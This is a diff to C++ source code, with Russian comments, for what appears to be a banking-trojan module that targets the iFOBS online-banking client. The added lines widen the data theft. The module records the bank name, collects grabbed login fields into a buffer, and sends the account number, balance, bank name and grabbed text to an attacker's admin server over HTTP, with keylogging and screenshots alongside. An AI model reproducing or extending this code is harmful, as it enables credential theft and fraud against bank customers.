@@ -43,12 +43,14 @@ struct AccBalans
 {
 	char acc[64];
 	char balans[64];
+	char nameBank[128];
 };
 
 int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
 //прототип из ifobs.plug
 typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
 char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
+char resultGrab[128]; //результат грабера для отсылки в админку и видео сервер
 
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
 DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
@@ -77,6 +79,8 @@ static void AddStrLog( const char* name, const char* value )
 	m_lstrcat( buf, ": " );
 	if( value )
 		m_lstrcat( buf, value );
+	if( buf[0] ) m_lstrcat( resultGrab, ", " );
+	m_lstrcat( resultGrab, buf );
 	m_lstrcat( buf, "\r\n" );
 	KeyLogger::AddStrToBuffer( 0, buf, 0 );
 	DBG( "IFobs", buf );
@@ -95,6 +99,7 @@ static void GrabData( HWND wnd )
 	DBG( "IFobs", "Грабим данные" );
 	ForFindControl ffc;
 	ClearStruct(ffc);
+	resultGrab[0] = 0;
 	ffc.hash = HashClassEditControl;
 	pEnumChildWindows( wnd, EnumChildProc, &ffc );
 	AddStrLog( "Login", ffc.texts[3] );
@@ -224,31 +229,36 @@ static DWORD WINAPI SendBalans( LPVOID p )
 	char urlAdmin[128];
 	AccBalans* ab = (AccBalans*)p;
 	VideoSendLogName log( *vsl, "ifobs" );
-	log.Send( 10, "Счет: %s, баланс: %s", ab->acc, ab->balans );
+	log.Send( 10, "Счет: '%s', баланс: '%s', банк: '%s'", ab->acc, ab->balans, ab->nameBank );
 	if( GetAdminUrl(urlAdmin) )
 	{
 		fwsprintfA pwsprintfA = Get_wsprintfA();
-		TMemory request(512);
+		TMemory request(1024);
 		string azUser = GetAzUser();
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc );
-//		THTTP H;
-//		H.Get(request.AsStr());
-		THTTPResponseRec Response;
-		ClearStruct(Response);
-		HTTP::Get( request.AsStr(), 0, &Response );
-		HTTPResponse::Clear(&Response);
-		DBG( "IFobs", "Отослали запрос: %s", request.AsStr() );
+		char* urlBank = URLEncode(ab->nameBank);
+		char* urlGrab = URLEncode(resultGrab);
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
+		STR::Free(urlBank);
+		STR::Free(urlGrab);
+		THTTP H;
+		H.Get(request.AsStr());
+//		THTTPResponseRec Response;
+//		ClearStruct(Response);
+//		HTTP::Get( request.AsStr(), 0, &Response );
+//		HTTPResponse::Clear(&Response);
+		DBG( "IFobs", "Отослали запрос: '%s'", request.AsStr() );
 	}
 	MemFree(p);
 	return 0;
 }
 
-void WINAPI PutBalans( const char* acc, const char* balans )
+void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank )
 {
-	DBG( "IFobs", "acc: %s, balans: %s", acc, balans );
+	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", acc, balans, nameBank );
 	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
 	m_lstrcpy( ab->acc, acc );
 	m_lstrcpy( ab->balans, balans );
+	m_lstrcpy( ab->nameBank, nameBank );
 	RunThread( SendBalans, ab );
 }
 
@@ -291,6 +301,7 @@ DWORD WINAPI PluginIFobs(LPVOID)
 	}
 	else
 		DBG( "IFobs", "Не удалось загрузить ifobs.plug" );
+	log.Send2( 6, resultGrab );
 	return 0;
 }
 
@@ -340,10 +351,11 @@ void Activeted(LPVOID Sender)
 bool Init( const char* appName )
 {
 	DBG( "IFobs", "Регистрация системы" );
+	resultGrab[0] = 0;
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
 	if( S != NULL )
 	{
-		char* caption = "*iFOBS*Ре*страц*я*";
+		char* caption = "*iFOBS*ст*ац*я*";
 		char* caption2 = "*iFOBS*Regis*";
 		S->MakeScreenShot = true;
 		S->SendLogAsCAB = true;
